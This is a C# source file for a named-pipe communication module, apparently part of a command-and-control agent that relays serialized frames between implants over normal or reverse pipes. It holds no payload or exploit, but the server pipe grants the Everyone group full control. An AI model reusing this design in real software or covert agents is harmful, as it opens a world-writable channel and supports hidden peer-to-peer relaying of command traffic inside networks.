using Agent.Communication;
using Agent.Service;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;
using Agent.Helpers;
using System.Text;
using BinarySerializer;
using Shared;
using System.Security.Principal;
using System.Security.AccessControl;

namespace Agent.Models
{
    public class PipeCommModule : P2PCommunicator
    {
        public PipeCommModule(ConnexionUrl conn) : base(conn)
        {
            if(conn.Protocol == ConnexionType.NamedPipe)
            {
                CommunicationMode = CommunicationModuleMode.Server;
                return;
            }
            if(conn.Protocol == ConnexionType.ReverseNamedPipe)
            {
                CommunicationMode = CommunicationModuleMode.Client;
                return;
            }

            throw new ArgumentException($"{conn.Protocol} is not a valid protocol.");
        }

        private NamedPipeServerStream _pipeServer;
        private NamedPipeClientStream _pipeClient;

        public override event Func<NetFrame, Task> FrameReceived;
        public override event Action OnException;

        public override void Init(Agent agent)
        {
            _tokenSource = new CancellationTokenSource();

            switch (this.CommunicationMode)
            {
                case CommunicationModuleMode.Server:
                    {
                        var ps = new PipeSecurity();
                        ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null),
                            PipeAccessRights.FullControl, AccessControlType.Allow));

                        _pipeServer = new NamedPipeServerStream(this.Connexion.PipeName, PipeDirection.InOut,
                            NamedPipeServerStream.MaxAllowedServerInstances,
                            PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);

                        break;
                    }

                case CommunicationModuleMode.Client:
                    {
                        _pipeClient = new NamedPipeClientStream(this.Connexion.Address, this.Connexion.PipeName, PipeDirection.InOut,
                            PipeOptions.Asynchronous);

                        break;
                    }

                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public override async Task Start(object otoken)
        {
            switch (this.CommunicationMode)
            {
                case CommunicationModuleMode.Server:
                    {
                        _pipeServer.WaitForConnectionAsync().Wait();
                        break;
                    }

                case CommunicationModuleMode.Client:
                    {
                        var timeout = new CancellationTokenSource(new TimeSpan(0, 0, 30));
                        _pipeClient.ConnectAsync(timeout.Token).Wait();

                        _pipeClient.ReadMode = PipeTransmissionMode.Byte;

                        break;
                    }

                default:
                    throw new ArgumentOutOfRangeException();
            }

            this.IsRunning = true;
      
            PipeStream pipeStream;
            
            switch(this.CommunicationMode)
            {
                case CommunicationModuleMode.Server:
                    pipeStream = _pipeServer; break;
                case CommunicationModuleMode.Client:
                    pipeStream = _pipeClient; break;

                default: throw new ArgumentOutOfRangeException();
            };

            while (!_tokenSource.IsCancellationRequested)
            {
                try
                {
                    if (pipeStream.DataAvailable())
                    {
                        var data = pipeStream.ReadStream().Result;
                        var frame = data.BinaryDeserializeAsync<NetFrame>().Result;

                        this.FrameReceived?.Invoke(frame);
                    }
                }
                catch
                {
                    this.OnException?.Invoke();
                    return;
                }

                Task.Delay(100).Wait();
            }

            _pipeServer?.Dispose();
            _pipeClient?.Dispose();
            _tokenSource.Dispose();
        }

        public override async Task SendFrame(NetFrame frame)
        {
            PipeStream pipeStream;
            switch (this.CommunicationMode)
            {
                case CommunicationModuleMode.Server:
                    pipeStream = _pipeServer; break;
                case CommunicationModuleMode.Client:
                    pipeStream = _pipeClient; break;

                default: throw new ArgumentOutOfRangeException();
            };
           
            try
            {
                var data = await frame.BinarySerializeAsync();
                await pipeStream.WriteStream(data);
            }
            catch
            {
                OnException?.Invoke();
            }
        }


    }
}
